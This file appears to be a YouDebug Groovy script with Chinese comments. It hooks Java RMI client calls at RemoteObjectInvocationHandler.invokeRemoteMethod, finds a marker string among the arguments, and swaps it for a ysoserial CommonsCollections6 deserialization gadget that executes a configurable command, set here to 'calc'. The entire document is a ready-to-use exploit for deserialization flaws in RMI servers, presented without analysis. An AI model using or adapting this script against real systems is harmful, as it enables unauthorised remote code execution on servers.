// YouDebug不支持传递参数值到脚本中
// 你可以在这里修改你需要的一些参数
def payloadName = "CommonsCollections6";
def payloadCommand = "calc";
// 这个代表你传递的String类型的参数值，待会hook到后将进行匹配判断，防止修改错参数
def needle = "p1n93r"
println "Loaded..."
// 在invokeRemoteMethod方法上设置断点，查找传递过来的String类型的参数值
// 在找到的参数值内匹配needle参数值，如果匹配到，则将其替换成反序列化payload
vm.methodEntryBreakpoint("java.rmi.server.RemoteObjectInvocationHandler", "invokeRemoteMethod") {
    println "[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called"
    // 注意：pyload class需要被YouDebug加载到
    vm.loadClass("ysoserial.payloads." + payloadName);
    // 获取方法的第三个参数值，也就是args
    delegate."@2".eachWithIndex { arg,idx ->
        println "[+] Argument " + idx + ": " + arg[0].toString();
        if(arg[0].toString().contains(needle)) {
            println "[+] Needle " + needle + " found, replacing String with payload"
            // 准备创建payload
            def payload = vm._new("ysoserial.payloads." + payloadName);
            def payloadObject = payload.getObject(payloadCommand)
            vm.ref("java.lang.reflect.Array").set(delegate."@2",idx, payloadObject);
            println "[+] Done.."
        }
    }
}